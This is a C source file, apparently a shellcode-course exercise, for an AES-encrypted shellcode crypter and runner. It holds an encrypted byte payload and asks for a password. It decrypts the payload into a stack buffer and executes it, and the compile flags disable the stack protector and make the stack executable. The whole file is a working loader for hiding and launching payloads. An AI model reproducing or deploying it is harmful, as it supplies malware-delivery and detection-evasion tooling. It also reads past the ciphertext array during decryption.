/*
Filename: hodor-decrypt-run.c
Author: hodorsec
Description: Decrypts a file as input with a given password, outputs in C hex and run the code
Compile with: gcc -fno-stack-protector -z execstack -fno-pie -o hodor-decrypt-run hodor-decrypt-run.c  -lcrypto -I /usr/include/openssl -L /usr/lib/
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/aes.h>
#include <unistd.h>

/* Output encrypted and decrypted */
void print_data(const char *title, const void* data, int len);

/* Do the actual work */
int main(int argc, char **argv)
{
	/* Input */
	const char enc_in[] = \
	"\x58\x8C\xE6\xF3\x0D\x12\x5A\x42\xFD\x86\xA2\x9B\x81\xC6\x6F\xAD"\
	"\xA1\x6A\xC5\xA1\xF9\xB8\xEE\xA1\xCD\xB4\xB2\x82\x72\x4C\x15\xC3"\
	"\x91\x38\x99\x6A\x4F\xAA\x05\x1D\x29\x76\x63\x51\x64\xB3\x9B\xBD"\
	"\xF9\x63\x6B\xA3\x5F\x7A\xF9\x64\x0E\xE0\x20\x92\xA0\xD5\x53\x4B"\
	"\x45\x8A\x29\xF6\x5B\xBA\x1C\x24\x1D\xF2\x72\x06\x4A\x4F\x33\x85"\
	"\x0D\xE1\x42\x16\x22\xE4\x4B\x25\x2F\x6F\x3A\x8A\x5D\x57\xD5\x35"\
	"\xB3\x01\x21\x10\x15\xAB\x13\xC0\xB3\xFE\xC8\xB3\x55\x4C\xEF\x83";
	
	int lenShell = sizeof(enc_in) - 1;		// Minus NULL-byte
	
	// Variables
	int lenBits = 128;				// AES bits

	// Check password
	char *enterPass = "Enter password to decrypt: ";
	unsigned char *key = (char*)getpass(enterPass);

	// IV
	unsigned char ivDec[AES_BLOCK_SIZE] = "HODORHODORHODOR!"; // 16 bytes

	// Buffers and padding for encryption and decryption
	const size_t lenDec = ((lenShell + AES_BLOCK_SIZE) / AES_BLOCK_SIZE) * AES_BLOCK_SIZE;
	unsigned char shell_dec[lenDec];
	memset(shell_dec, 0, sizeof(shell_dec));

	// Initialize keys
	AES_KEY decKey;
	
	// Decrypt
	// int AES_set_decrypt_key(const unsigned char *userKey, const int bits, AES_KEY *key);
	AES_set_decrypt_key(key, lenBits, &decKey);
	// void AES_cbc_encrypt(const unsigned char *in, unsigned char *out, size_t length, const AES_KEY *key, unsigned char *ivec, const int enc);	
	AES_cbc_encrypt(enc_in, shell_dec, lenDec, &decKey, ivDec, AES_DECRYPT); // AES_DECRYPT == 0 from <openssl/aes.h>
	
	// Output
	print_data("\nENCRYPTED", enc_in, lenShell);
	print_data("\nDECRYPTED", shell_dec, lenDec);
	printf("\n");

	printf("Running shellcode...\n");
    	int (*ret)() = (int(*)())shell_dec;
    	ret();

	return 0;
}

void print_data(const char *title, const void* data, int len)
{
	printf("%s:",title);
	const unsigned char * p = (const unsigned char*)data;
	const unsigned char * q = (const unsigned char*)data;
	int i = 0;		// Counter
	int n = 16;		// Print a newline every N char
	
	printf("\nOneliner:\n\"");

	for (; i < len; ++i) {
		if (*p != '\0') {
			printf("\\x%02X", *p++);
		} else
			break;
	}
	printf("\";\n");
	i = 0;
	printf("\n16-byte newline delimiter:\n\"");

	for (; i < len; ++i) {
		if (*q != '\0') {
			if (i % 16 == 0 && i != 0) {
				printf("\"\\\n\"");
			}
			printf("\\x%02X", *q++);
		} else
			break;
	}
	printf("\";\n");
}

